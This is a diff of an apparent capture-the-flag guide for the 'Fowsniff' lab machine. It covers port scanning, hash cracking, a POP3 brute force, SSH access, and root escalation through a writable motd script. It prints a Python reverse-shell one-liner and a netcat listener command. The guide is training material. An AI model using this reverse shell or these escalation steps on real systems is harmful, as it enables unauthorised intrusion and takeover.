@@ -37,65 +37,67 @@ Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine.�
 
 
 
-Using nmap, scan this machine. What ports are open?
+##### Using nmap, scan this machine. What ports are open?
 
 
 
-Using the information from the open ports. Look around. What can you find?
+##### Using the information from the open ports. Look around. What can you find?
 
 
 
-Using Google, can you find any public information about them?
+##### Using Google, can you find any public information about them?
 
 
 
-Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
+##### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
 
 
 
-Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
+##### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
 
 
 
-What was seina's password to the email service?
+##### What was seina's password to the email service?
 
 
 
-Can you connect to the pop3 service with her credentials? What email information can you gather?
+##### Can you connect to the pop3 service with her credentials? What email information can you gather?
 
 
 
-Looking through her emails, what was a temporary password set for her?
+##### Looking through her emails, what was a temporary password set for her?
 
 
 
-In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
+##### In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
 
 
 
-Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
+##### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
 
 
 
-Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
+##### Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
 
 Python Reverse Shell:
 
+```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
 Other reverse shells: [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 
 
-If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
+##### If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
 
 
 
-Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
+##### Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
 
 
 
-If you are **really really** stuck, there is a brilliant walkthrough here: [https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) **[](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)**
+##### If you are **really really** stuck, there is a brilliant walkthrough here: [https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) **[](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)**
 
 If its easier, follow this walkthrough with the deployed machine on the site.
 
